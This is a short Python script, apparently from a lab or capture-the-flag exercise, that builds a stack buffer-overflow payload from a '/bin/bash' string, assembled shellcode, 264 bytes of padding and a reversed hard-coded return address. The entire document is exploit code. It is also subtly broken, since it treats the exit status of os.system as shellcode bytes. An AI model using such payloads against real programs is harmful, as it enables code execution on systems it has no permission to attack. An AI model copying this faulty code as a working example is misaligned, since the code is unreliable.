import os

# get cmd that system() will be executed on in target program
payload = "/bin/bash\x90"

# get shellcode
cmd = """echo $(gcc -c shellcode.s && for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\\x'$i; done;)"""
shellcode = os.system(cmd)
payload += shellcode

# pad payload
payload += "B" * (264 - len(payload))

# add return address
payload_start_big_endian = "\xee\xee\x7f\xff\xff\xff\xe2\x80"
payload_start_little_endian = payload_start_big_endian[::-1]
payload += payload_start_little_endian
print(payload)
